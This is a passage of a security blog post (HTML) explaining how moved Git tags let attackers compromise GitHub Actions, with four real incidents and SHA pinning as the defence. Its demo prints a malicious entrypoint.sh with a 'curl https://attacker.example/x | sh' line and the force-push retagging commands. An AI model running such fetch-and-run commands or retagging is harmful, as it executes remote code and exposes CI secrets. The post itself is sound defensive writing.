@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    
+    
+    
+    
+    
+    
+    
+
+    <meta name="description" content="A workflow that uses some/action@v4 runs whatever v4 points to when the job starts, and anyone with push access to that repository can change it. Four real GitHub Actions compromises, three of them CVEs, show what happens when a tag gets moved, why pinning to a full commit SHA protects you, where a SHA still leaves gaps, and how to pin without making updates painful.">
+    <meta name="author" content="Kumar Anirudha">
+    <link rel="canonical" href="https://blog.anirudha.dev/who-moved-my-tag/">
+
+    
+    <meta itemprop="name" content="Who Moved My Tag? | AniLog">
+    <meta itemprop="description" content="A workflow that uses some/action@v4 runs whatever v4 points to when the job starts, and anyone with push access to that repository can change it. Four real GitHub Actions compromises, three of them CVEs, show what happens when a tag gets moved, why pinning to a full commit SHA protects you, where a SHA still leaves gaps, and how to pin without making updates painful.">
+    <meta itemprop="image" content="https://blog.anirudha.dev/images/posts/who-moved-my-tag-cover-og.png">
+
+    
+    <meta property="og:title" content="Who Moved My Tag? | AniLog">
+    <meta property="og:description" content="A workflow that uses some/action@v4 runs whatever v4 points to when the job starts, and anyone with push access to that repository can change it. Four real GitHub Actions compromises, three of them CVEs, show what happens when a tag gets moved, why pinning to a full commit SHA protects you, where a SHA still leaves gaps, and how to pin without making updates painful.">
+    <meta property="og:url" content="https://blog.anirudha.dev/who-moved-my-tag/">
+    <meta property="og:site_name" content="AniLog">
+    <meta property="og:locale" content="en_GB">
+    <meta property="og:type" content="article">
+    <meta property="og:image" content="https://blog.anirudha.dev/images/posts/who-moved-my-tag-cover-og.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Who Moved My Tag?">
+    <meta property="article:author" content="Kumar Anirudha">
+    <meta property="article:published_time" content="2026-10-24T00:00:00Z">
+    <meta property="article:modified_time" content="2026-10-24T00:00:00Z">
+    <meta property="article:tag" content="security">
+    <meta property="article:tag" content="supply-chain">
+    <meta property="article:tag" content="github-actions">
+    <meta property="article:tag" content="github">
+    <meta property="article:tag" content="ci-cd">
+    <meta property="article:tag" content="git">
+    <meta property="article:tag" content="cve">
+    <meta property="article:tag" content="devtools">
+    <meta property="article:tag" content="open-source">
+
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Who Moved My Tag? | AniLog">
+    <meta name="twitter:description" content="A workflow that uses some/action@v4 runs whatever v4 points to when the job starts, and anyone with push access to that repository can change it. Four real GitHub Actions compromises, three of them CVEs, show what happens when a tag gets moved, why pinning to a full commit SHA protects you, where a SHA still leaves gaps, and how to pin without making updates painful.">
+    <meta name="twitter:site" content="@kranirudha">
+    <meta name="twitter:creator" content="@kranirudha">
+    <meta name="twitter:image" content="https://blog.anirudha.dev/images/posts/who-moved-my-tag-cover-og.png">
+    <meta name="twitter:image:alt" content="Who Moved My Tag?">
+
+    <link rel="icon" type="image/png" href="/me.png" />
+    <link rel="alternate" type="application/atom+xml" title="AniLog" href="https://blog.anirudha.dev/feed/feed.xml" />
+
+    <title>Who Moved My Tag? | AniLog</title>
+
+    <link rel="stylesheet" href="/assets/main.bundle.css">
+    
+<style>
+  .tag.ai {
+    background: color-mix(in srgb, #10b981 8%, transparent);
+    border-color: color-mix(in srgb, #10b981 35%, transparent);
+    color: #6ee7b7;
+  }
+  [data-theme='reading'] .tag.ai,
+  [data-theme='beach'] .tag.ai,
+  [data-theme='hogwarts'] .tag.ai {
+    background: color-mix(in srgb, #059669 8%, transparent);
+    border-color: color-mix(in srgb, #059669 40%, transparent);
+    color: #047857;
+  }
+  [data-theme='hogwarts'] .post-item .tag.ai {
+    background: color-mix(in srgb, #10b981 12%, transparent);
+    border-color: color-mix(in srgb, #10b981 45%, transparent);
+    color: #6ee7b7;
+  }
+  .tag.wasm {
+    background: color-mix(in srgb, #3b82f6 8%, transparent);
+    border-color: color-mix(in srgb, #3b82f6 35%, transparent);
+    color: #93c5fd;
+  }
+  [data-theme='reading'] .tag.wasm,
+  [data-theme='beach'] .tag.wasm,
+  [data-theme='hogwarts'] .tag.wasm {
+    background: color-mix(in srgb, #2563eb 8%, transparent);
+    border-color: color-mix(in srgb, #2563eb 40%, transparent);
+    color: #1d4ed8;
+  }
+  [data-theme='hogwarts'] .post-item .tag.wasm {
+    background: color-mix(in srgb, #3b82f6 12%, transparent);
+    border-color: color-mix(in srgb, #3b82f6 45%, transparent);
+    color: #93c5fd;
+  }
+  .tag.thought {
+    background: color-mix(in srgb, #fb923c 8%, transparent);
+    border-color: color-mix(in srgb, #fb923c 35%, transparent);
+    color: #fdba74;
+  }
+  [data-theme='reading'] .tag.thought,
+  [data-theme='beach'] .tag.thought,
+  [data-theme='hogwarts'] .tag.thought {
+    background: color-mix(in srgb, #c2410c 8%, transparent);
+    border-color: color-mix(in srgb, #c2410c 40%, transparent);
+    color: #9a3412;
+  }
+  [data-theme='hogwarts'] .post-item .tag.thought {
+    background: color-mix(in srgb, #fb923c 12%, transparent);
+    border-color: color-mix(in srgb, #fb923c 45%, transparent);
+    color: #fdba74;
+  }
+  .tag.research {
+    background: color-mix(in srgb, #06b6d4 8%, transparent);
+    border-color: color-mix(in srgb, #06b6d4 35%, transparent);
+    color: #67e8f9;
+  }
+  [data-theme='reading'] .tag.research,
+  [data-theme='beach'] .tag.research,
+  [data-theme='hogwarts'] .tag.research {
+    background: color-mix(in srgb, #0891b2 8%, transparent);
+    border-color: color-mix(in srgb, #0891b2 40%, transparent);
+    color: #0e7490;
+  }
+  [data-theme='hogwarts'] .post-item .tag.research {
+    background: color-mix(in srgb, #06b6d4 12%, transparent);
+    border-color: color-mix(in srgb, #06b6d4 45%, transparent);
+    color: #67e8f9;
+  }
+  .tag.cyberspace {
+    background: color-mix(in srgb, #ef4444 8%, transparent);
+    border-color: color-mix(in srgb, #ef4444 35%, transparent);
+    color: #fca5a5;
+  }
+  [data-theme='reading'] .tag.cyberspace,
+  [data-theme='beach'] .tag.cyberspace,
+  [data-theme='hogwarts'] .tag.cyberspace {
+    background: color-mix(in srgb, #dc2626 8%, transparent);
+    border-color: color-mix(in srgb, #dc2626 40%, transparent);
+    color: #b91c1c;
+  }
+  [data-theme='hogwarts'] .post-item .tag.cyberspace {
+    background: color-mix(in srgb, #ef4444 12%, transparent);
+    border-color: color-mix(in srgb, #ef4444 45%, transparent);
+    color: #fca5a5;
+  }
+  .tag.build {
+    background: color-mix(in srgb, #ec4899 8%, transparent);
+    border-color: color-mix(in srgb, #ec4899 35%, transparent);
+    color: #f9a8d4;
+  }
+  [data-theme='reading'] .tag.build,
+  [data-theme='beach'] .tag.build,
+  [data-theme='hogwarts'] .tag.build {
+    background: color-mix(in srgb, #db2777 8%, transparent);
+    border-color: color-mix(in srgb, #db2777 40%, transparent);
+    color: #be185d;
+  }
+  [data-theme='hogwarts'] .post-item .tag.build {
+    background: color-mix(in srgb, #ec4899 12%, transparent);
+    border-color: color-mix(in srgb, #ec4899 45%, transparent);
+    color: #f9a8d4;
+  }
+</style>
+
+
+    <script>
+      // Set theme before page renders to prevent flash
+      (function() {
+        const theme = localStorage.getItem('theme') || 'night';
+        if (theme !== 'night') {
+          document.documentElement.setAttribute('data-theme', theme);
+        }
+      })();
+    </script>
+
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-YGZHVY9TD7"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-YGZHVY9TD7');
+    </script>
+    
+
+    
+  </head>
+  <body class="flex flex-col min-h-screen">
+    <canvas id="ambience-canvas"></canvas>
+    <header class="sticky top-0 z-50 glass-header">
+  <nav class="container mx-auto max-w-7xl px-8 py-3 flex flex-wrap items-center justify-between">
+    <div class="flex items-center gap-3">
+      <a href="/" class="flex items-center gap-3">
+        <img src="/ani.png" alt="AniLog logo" class="w-10 h-10 object-cover">
+        <h1 class="text-2xl leading-none m-0">AniLog</h1>
+      </a>
+    </div>
+
+    <div class="flex items-center gap-6">
+      <div class="theme-switcher">
+        <button id="theme-switcher-btn" class="theme-switcher-btn" aria-label="Switch theme" aria-expanded="false">
+          <span id="theme-active-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+          </span>
+        </button>
+        <div id="theme-dropdown" class="theme-dropdown">
+          <button class="theme-option" data-theme-value="night">
+            <span class="theme-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg></span>
+            <span>Night</span>
+          </button>
+          <button class="theme-option" data-theme-value="reading">
+            <span class="theme-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 7v14"/><path d="M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg></span>
+            <span>Reading</span>
+          </button>
+          <button class="theme-option" data-theme-value="forest">
+            <span class="theme-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m17 14 3 3.3a1 1 0 0 1-.7 1.7H4.7a1 1 0 0 1-.7-1.7L7 14h-.3a1 1 0 0 1-.7-1.7L9 9h-.2A1 1 0 0 1 8 7.3L12 3l4 4.3a1 1 0 0 1-.8 1.7H15l3 3.3a1 1 0 0 1-.7 1.7H17Z"/><path d="M12 22v-3"/></svg></span>
+            <span>Forest</span>
+          </button>
+          <button class="theme-option" data-theme-value="beach">
+            <span class="theme-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 8c0-2.76-2.46-5-5.5-5S2 5.24 2 8h2l1-1 1 1h4"/><path d="M13 7.14A5.82 5.82 0 0 1 16.5 6c3.04 0 5.5 2.24 5.5 5h-3l-1-1-1 1h-3"/><path d="M5.89 9.71c-2.15 2.15-2.3 5.47-.35 7.43l4.24-4.25.7-.7.71-.71 2.12-2.12c-1.95-1.96-5.27-1.8-7.42.35"/><path d="M11 15.5c.5 2.5-.17 4.5-1 6.5h4c2-5.5-.5-12-1-14"/></svg></span>
+            <span>Beach</span>
+          </button>
+          <button class="theme-option" data-theme-value="cyberpunk">
+            <span class="theme-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20v2"/><path d="M12 2v2"/><path d="M17 20v2"/><path d="M17 2v2"/><path d="M2 12h2"/><path d="M2 17h2"/><path d="M2 7h2"/><path d="M20 12h2"/><path d="M20 17h2"/><path d="M20 7h2"/><path d="M7 20v2"/><path d="M7 2v2"/><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="8" y="8" width="8" height="8" rx="1"/></svg></span>
+            <span>Cyberpunk</span>
+          </button>
+          <button class="theme-option" data-theme-value="hogwarts">
+            <span class="theme-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.64 3.64-1.28-1.28a1.21 1.21 0 0 0-1.72 0L2.36 18.64a1.21 1.21 0 0 0 0 1.72l1.28 1.28a1.2 1.2 0 0 0 1.72 0L21.64 5.36a1.2 1.2 0 0 0 0-1.72"/><path d="m14 7 3 3"/><path d="M5 6v4"/><path d="M19 14v4"/><path d="M10 2v2"/><path d="M7 8H3"/><path d="M21 16h-4"/><path d="M11 3H9"/></svg></span>
+            <span>Hogwarts</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </nav>
+</header>
+
+    <main class="container mx-auto max-w-6xl p-8 grow">
+      
+    <p></p>
+
+    <article class="post-article">
+        
+        <div class="prophet-masthead">
+            
+                <div class="prophet-dateline">
+                    
+                        <span>Published <time class="relative-date" datetime="2026-10-24" title="October 24, 2026">on October 24, 2026</time></span>
+                    
+                    <span>October 24, 2026</span>
+                    <span>18 min read</span>
+                </div>
+            
+            <div class="prophet-motto" aria-hidden="true">The wizarding world's beguiling broadsheet of choice</div>
+        </div>
+
+        
+            <div class="post-cover-frame">
+                <div class="post-cover-image" style="background-image: url('/images/posts/who-moved-my-tag-cover.svg');"></div>
+            </div>
+        
+
+        <div>
+            <div class="post-title-row">
+                <h2>Who Moved My Tag?</h2>
+                
+            </div>
+
+            
+                <div class="mt-4 mb-2">
+                    <a class="tag security" href="/tag/security">security</a><a class="tag supply-chain" href="/tag/supply-chain">supply-chain</a><a class="tag github-actions" href="/tag/github-actions">github-actions</a><a class="tag github" href="/tag/github">github</a><a class="tag ci-cd" href="/tag/ci-cd">ci-cd</a><a class="tag git" href="/tag/git">git</a><a class="tag cve" href="/tag/cve">cve</a><a class="tag devtools" href="/tag/devtools">devtools</a><a class="tag open-source" href="/tag/open-source">open-source</a>
+                </div>
+            
+
+            
+                
+                    <p class="text-sm italic">Published
+                        <time class="relative-date" datetime="2026-10-24" title="October 24, 2026">on October 24, 2026</time>.
+                        <span class="reading-time"> · 18 min read</span></p>
+                
+            
+
+            <div class="content post">
+                <p>While writing this, I opened the release workflow of one of my own projects. This is the job that publishes <a href="https://github.com/anistark/sutras">sutras</a> to PyPI:</p>
+<code-block lang="yaml"><pre class="language-yaml"><code class="language-yaml">  <span class="token key atrule">publish-pypi</span><span class="token punctuation">:</span>
+    <span class="token key atrule">needs</span><span class="token punctuation">:</span> build
+    <span class="token key atrule">runs-on</span><span class="token punctuation">:</span> ubuntu<span class="token punctuation">-</span>latest
+    <span class="token key atrule">environment</span><span class="token punctuation">:</span>
+      <span class="token key atrule">name</span><span class="token punctuation">:</span> pypi
+      <span class="token key atrule">url</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span>//pypi.org/project/sutras/
+    <span class="token key atrule">permissions</span><span class="token punctuation">:</span>
+      <span class="token key atrule">id-token</span><span class="token punctuation">:</span> write
+    <span class="token key atrule">steps</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Download dist
+        <span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/download<span class="token punctuation">-</span>artifact@v4
+        <span class="token key atrule">with</span><span class="token punctuation">:</span>
+          <span class="token key atrule">name</span><span class="token punctuation">:</span> dist
+          <span class="token key atrule">path</span><span class="token punctuation">:</span> dist/
+
+      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> Publish to PyPI
+        <span class="token key atrule">uses</span><span class="token punctuation">:</span> pypa/gh<span class="token punctuation">-</span>action<span class="token punctuation">-</span>pypi<span class="token punctuation">-</span>publish@release/v1</code></pre>
+</code-block><p><code>v4</code> is a tag. <code>release/v1</code> is a branch. The job has <code>id-token: write</code>, which is the permission PyPI trusted publishing uses to mint an upload token. So the step that holds the keys to my package runs whatever commit a branch in someone else’s repository points to on the day the release runs.</p>
+<p>I trust the PyPA folks. That’s not the point. The point is that I’m not trusting the code I reviewed. I’m trusting that nobody, ever, gets push access to that repository and moves that branch.</p>
+<p>And that assumption has failed in public, more than once. Not for PyPA, but for other popular actions.</p>
+<p><em>A tag is a sticky note. A commit SHA is a fingerprint.</em></p>
+<h2 id="what-%40v4-actually-means" tabindex="-1">What <code>@v4</code> actually means <a class="header-anchor" href="#what-%40v4-actually-means" aria-hidden="true">#</a></h2>
+<p>In Git, tags and branches are names that point to a commit. That’s all they are. A branch is designed to move. A tag usually doesn’t, but it can: anyone with push access can repoint it with <code>git tag -f</code> and <code>git push -f</code>, and every workflow that says <code>@v1</code> will pick up the new commit on its next run.</p>
+<p>For GitHub Actions, moving tags isn’t even unusual. It’s the recommended release process. GitHub’s own guide for action authors tells maintainers to:</p>
+<blockquote>
+<p>Move the major version tag (for example, <code>v1</code>) to point to the Git ref of the current release.</p>
+</blockquote>
+<p>You can see it on <code>actions/checkout</code>. At the time of writing, <code>v7</code> and <code>v7.0.1</code> point at the same commit, and <code>v7.0.0</code> points somewhere else:</p>
+<terminal-block>git ls-remote --tags https://github.com/actions/checkout | grep v7</terminal-block><code-block lang="text"><pre class="language-text"><code class="language-text">3d3c42e5aac5ba805825da76410c181273ba90b1	refs/tags/v7
+9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0	refs/tags/v7.0.0
+3d3c42e5aac5ba805825da76410c181273ba90b1	refs/tags/v7.0.1</code></pre>
+</code-block><p>That’s the normal, intended behaviour. <code>@v7</code> means <em>“whatever the maintainers currently call v7.”</em> Most of the time that’s exactly what you want, because you get fixes without touching your workflow. It’s also exactly what an attacker wants.</p>
+<p>Here’s the whole attack in a throwaway local repo. A maintainer publishes <code>v1</code>, then someone with push access points <code>v1</code> at a different commit:</p>
+<terminal-block>git ls-remote upstream.git refs/tags/v1</terminal-block><code-block lang="text"><pre class="language-text"><code class="language-text">dc9459c7795073ee3b231085b17213ad88538cfb	refs/tags/v1</code></pre>
+</code-block><terminal-block># someone with push access, later:
+git tag -f v1 &amp;&amp; git push -f origin v1
+git ls-remote upstream.git refs/tags/v1</terminal-block><code-block lang="text"><pre class="language-text"><code class="language-text">0223158bb53f0e63895846be5336913ab88a1a56	refs/tags/v1</code></pre>
+</code-block><p>Same name, different commit. Now look at what a consumer gets, by tag and by SHA:</p>
+<terminal-block>git checkout -q v1 &amp;&amp; cat entrypoint.sh</terminal-block><code-block lang="text"><pre class="language-text"><code class="language-text">#!/bin/sh
+curl -sSf https://attacker.example/x | sh
+echo "linting files"</code></pre>
+</code-block><terminal-block>git checkout -q dc9459c7795073ee3b231085b17213ad88538cfb &amp;&amp; cat entrypoint.sh</terminal-block><code-block lang="text"><pre class="language-text"><code class="language-text">#!/bin/sh
+echo "linting files"</code></pre>
+</code-block><p>Nothing on the consumer side changed. Same workflow file, same <code>uses:</code> line. The <code>main</code> branch in that repo still points at the clean commit too, so anyone browsing the repository sees nothing wrong. The malicious commit is reachable only through the tag.</p>
+<p><img src="/images/posts/who-moved-my-tag-tag-moves.svg" alt="A commit graph where the v1 tag slides from the original commit to a new malicious commit, while a reference pinned to the original commit's SHA stays where it is"></p>
+<p>A full commit SHA doesn’t have this problem. A Git commit ID is a hash of the commit’s content, which includes its tree and its parents. Change one byte of code and you get a different ID. So <code>@dc9459c7795073ee3b231085b17213ad88538cfb</code> can only ever mean that exact code. GitHub’s <a href="https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions">secure use reference</a> puts it this way: to backdoor a SHA-pinned action, an attacker <em>“would need to generate a SHA-1 collision for a valid Git object payload.”</em></p>
+<p>If you’re thinking <em>“isn’t SHA-1 broken?”</em>: since <a href="https://github.com/git/git/blob/master/Documentation/RelNotes/2.13.0.adoc">Git 2.13</a>, Git’s default SHA-1 implementation is the one by Marc Stevens and Dan Shumow that detects attempts to create collisions.</p>
+<p>The same docs are just as direct about tags:</p>
+<blockquote>
+<p>Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action.</p>
+</blockquote>
+<p>That’s the theory. Here’s what it looks like when it actually happens.</p>
+<h2 id="it-has-already-happened" tabindex="-1">It has already happened <a class="header-anchor" href="#it-has-already-happened" aria-hidden="true">#</a></h2>
+<p>Each of these was a real compromise of a widely used GitHub Action. Each time, the attacker moved existing tags. Nobody’s workflow file changed.</p>
+<h3 id="tj-actions%2Fchanged-files%2C-march-2025-(cve-2025-30066)" tabindex="-1">tj-actions/changed-files, March 2025 (CVE-2025-30066) <a class="header-anchor" href="#tj-actions%2Fchanged-files%2C-march-2025-(cve-2025-30066)" aria-hidden="true">#</a></h3>
+<p><a href="https://github.com/advisories/GHSA-mrrh-fwg8-r2c3"><code>tj-actions/changed-files</code></a> lists changed files in a PR. It was used by over 23,000 repositories. Between March 14 and March 15, 2025, attackers <em>“retroactively modified multiple version tags to reference a malicious commit”</em>, <a href="https://github.com/tj-actions/changed-files/commit/0e58ed8671d6b60d0890c21b07f8835ace038e67"><code>0e58ed8</code></a>.</p>
+<p>That commit downloaded a Python script, which read the memory of the GitHub Actions <code>Runner.Worker</code> process, where decrypted secrets live. It then printed them, double base64-encoded, into the workflow log. On a public repository, anyone can read those logs.</p>
+<p><a href="https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised">StepSecurity</a> caught it because a lint step suddenly made an outbound call to <code>gist.githubusercontent.com</code>. The advisory scores it 8.6 (High), and CISA added it to its <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2025-30066">Known Exploited Vulnerabilities catalog</a> on March 18, 2025.</p>
+<h3 id="how-they-got-the-keys%3A-reviewdog-and-spotbugs-(cve-2025-30154)" tabindex="-1">How they got the keys: reviewdog and SpotBugs (CVE-2025-30154) <a class="header-anchor" href="#how-they-got-the-keys%3A-reviewdog-and-spotbugs-(cve-2025-30154)" aria-hidden="true">#</a></h3>
+<p>How did the attacker get push access to tj-actions? <a href="https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/">Palo Alto’s Unit 42</a> traced it back months, through two other projects:</p>
+<p><img src="/images/posts/who-moved-my-tag-attack-chain.svg" alt="Timeline of the attack chain: November 28, 2024 a SpotBugs maintainer adds a personal access token to a workflow; December 6, 2024 the token is leaked through a malicious pull request; March 11, 2025 the reviewdog/action-setup v1 tag points to malicious code; March 14, 2025 the tj-actions/changed-files tags are repointed, with Coinbase's agentkit as the target"></p>
+<ol>
+<li><strong>November 28, 2024.</strong> A SpotBugs maintainer changed a <code>sonar-findbugs</code> workflow to use their own personal access token (PAT).</li>
+<li><strong>December 6, 2024.</strong> The attacker opened a malicious pull request that exploited a <code>pull_request_target</code> workflow and leaked that token. With it, they got a malicious workflow into <code>spotbugs/spotbugs</code> that leaked all of that repository’s secrets, which included a reviewdog maintainer’s PAT.</li>
+<li><strong>March 11, 2025, 18:42 to 20:31 UTC.</strong> <a href="https://github.com/advisories/GHSA-qmg3-hpqr-gqvc"><code>reviewdog/action-setup@v1</code></a> was compromised. Per <a href="https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup">Wiz</a>, the <code>v1</code> tag was updated to code the attacker had placed on a fork, with the payload inserted base64-encoded into <code>install.sh</code>.</li>
+<li><strong>March 14, 2025.</strong> Per Unit 42, the attacker got write access to tj-actions/changed-files <em>“using the PAT that they previously acquired by infecting reviewdog/action-setup”</em>, and used it to repoint the tags.</li>
+</ol>
+<p>And the real target wasn’t the 23,000 repositories. Unit 42 says <em>“the attacker created a campaign targeted at Coinbase”</em>, specifically <code>coinbase/agentkit</code>, whose workflow depended on <code>tj-actions/changed-files</code>. Coinbase reported that <em>“the attack was unsuccessful at causing any damage to the agentkit project, or any other Coinbase asset.”</em></p>
+<p>The 23,000 other repositories were collateral damage.</p>
+<h3 id="trivy%2C-march-2026-(cve-2026-33634)" tabindex="-1">Trivy, March 2026 (CVE-2026-33634) <a class="header-anchor" href="#trivy%2C-march-2026-(cve-2026-33634)" aria-hidden="true">#</a></h3>
+<p>A year later, it was a security scanner’s turn. From <a href="https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23">Aqua’s own advisory</a>: on March 19, 2026, a threat actor used compromised credentials to <em>“force-push 76 of 77 version tags in <code>aquasecurity/trivy-action</code> to credential-stealing malware, and replace all 7 tags in <code>aquasecurity/setup-trivy</code> with malicious commits.”</em></p>
+<p>The injected code ran <em>before</em> the real Trivy scan, so pipelines looked completely normal. Meanwhile it:</p>
+<ul>
+<li>dumped <code>Runner.Worker</code> process memory through <code>/proc/&lt;pid&gt;/mem</code> to pull out secrets,</li>
+<li>swept more than 50 filesystem paths for SSH keys, cloud credentials, Kubernetes tokens, Docker configs, <code>.env</code> files and crypto wallets,</li>
+<li>encrypted everything and sent it to attacker infrastructure, and if that failed and a PAT was available, created a public <code>tpcp-docs</code> repository on the victim’s own account and uploaded the stolen data there.</li>
+</ul>
+<p>The <code>trivy-action</code> tags were malicious for about 12 hours. The advisory traces the root cause to a supply chain attack that started in late February 2026: after the first disclosure on March 1, credentials were rotated, but <em>“not atomic (not all credentials were revoked simultaneously)”</em>, which could have let the attacker keep access. It was rated Critical, and CISA added it to the <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-33634">KEV catalog</a> on March 26, 2026.</p>
+<p>The interesting part is who was <strong>not</strong> affected. Among the cases the advisory lists:</p>
+<ul>
+<li>workflows pinned by SHA to a safe <code>trivy-action</code> commit from after 2025-04-09 (more on that date below),</li>
+<li>the <code>0.35.0</code> tag, because it was protected by GitHub’s immutable releases,</li>
+<li>Trivy container images referenced <strong>by digest</strong>.</li>
+</ul>
+<p>Every safe path on that list is an immutable reference.</p>
+<h3 id="actions-cool%2Fissues-helper%2C-may-2026" tabindex="-1">actions-cool/issues-helper, May 2026 <a class="header-anchor" href="#actions-cool%2Fissues-helper%2C-may-2026" aria-hidden="true">#</a></h3>
+<p>Two months later, the same pattern again. On May 18, 2026, <a href="https://www.stepsecurity.io/blog/actions-cool-issues-helper-github-action-compromised-all-tags-point-to-imposter-commit-that-exfiltrates-ci-cd-credentials">StepSecurity reported</a> that every tag of <code>actions-cool/issues-helper</code>, 53 in total, had been moved to impostor commits: commits that don’t appear anywhere in the action’s normal history. All 15 tags of <code>actions-cool/maintain-one-comment</code> got the same treatment. The payload downloaded the Bun runtime, read <code>Runner.Worker</code> memory for credentials, and sent them to an attacker-controlled domain.</p>
+<p>StepSecurity’s summary would work as a summary of this whole section: <em>“Only workflows pinned to a known-good full commit SHA are unaffected.”</em></p>
+<h3 id="all-four%2C-side-by-side" tabindex="-1">All four, side by side <a class="header-anchor" href="#all-four%2C-side-by-side" aria-hidden="true">#</a></h3>
+<table>
+<thead>
+<tr>
+<th>Incident</th>
+<th>When</th>
+<th>What was moved</th>
+<th>Payload</th>
+<th>Advisory</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>reviewdog/action-setup</code></td>
+<td>Mar 11, 2025</td>
+<td><code>v1</code> tag</td>
+<td>secrets dumped to workflow logs</td>
+<td><a href="https://github.com/advisories/GHSA-qmg3-hpqr-gqvc">CVE-2025-30154</a>, High 8.6, in KEV</td>
+</tr>
+<tr>
+<td><code>tj-actions/changed-files</code></td>
+<td>Mar 14 to 15, 2025</td>
+<td>multiple version tags</td>
+<td><code>Runner.Worker</code> memory dumped to logs</td>
+<td><a href="https://github.com/advisories/GHSA-mrrh-fwg8-r2c3">CVE-2025-30066</a>, High 8.6, in KEV</td>
+</tr>
+<tr>
+<td><code>aquasecurity/trivy-action</code> and <code>setup-trivy</code></td>
+<td>Mar 19 to 20, 2026</td>
+<td>76 of 77 tags, and all 7 tags</td>
+<td>memory dump, filesystem sweep, encrypted exfiltration</td>
+<td><a href="https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23">CVE-2026-33634</a>, Critical, in KEV</td>
+</tr>
+<tr>
+<td><code>actions-cool/issues-helper</code> and <code>maintain-one-comment</code></td>
+<td>May 2026</td>
+<td>all 53 tags, and all 15 tags</td>
+<td>memory dump, exfiltration</td>
+<td><a href="https://www.stepsecurity.io/blog/actions-cool-issues-helper-github-action-compromised-all-tags-point-to-imposter-commit-that-exfiltrates-ci-cd-credentials">StepSecurity report</a></td>
+</tr>
+</tbody>
+</table>
+<p>Four incidents. The attackers had different entry points each time, but the step that reached everyone downstream was the same: move a tag.</p>
+<h2 id="a-sha-is-necessary%2C-not-sufficient" tabindex="-1">A SHA is necessary, not sufficient <a class="header-anchor" href="#a-sha-is-necessary%2C-not-sufficient" aria-hidden="true">#</a></h2>
+<p>Pinning your own <code>uses:</code> lines to SHAs is the biggest single fix here. But all four incidents above also show where it stops working. Five gaps are worth knowing about.</p>
+<h3 id="1.-your-pin-doesn%E2%80%99t-pin-what-the-action-uses" tabindex="-1">1. Your pin doesn’t pin what the action uses <a class="header-anchor" href="#1.-your-pin-doesn%E2%80%99t-pin-what-the-action-uses" aria-hidden="true">#</a></h3>
+<p>An action can call other actions. A composite action’s own <code>action.yml</code> has <code>uses:</code> lines too, and your SHA pin does nothing for those. If the action you pinned calls <code>some/other-action@v1</code>, you’re still exposed to <code>v1</code> moving.</p>
+<p>The reviewdog advisory says it plainly. Other reviewdog actions that used <code>reviewdog/action-setup@v1</code> were also compromised, <em>“regardless of version or pinning method.”</em></p>
+<p>Trivy is an even more precise example. Until April 2025, <code>trivy-action</code> called <code>setup-trivy</code> by tag. <a href="https://github.com/aquasecurity/trivy-action/pull/456">PR #456</a>, merged on 2025-04-09, changed that:</p>
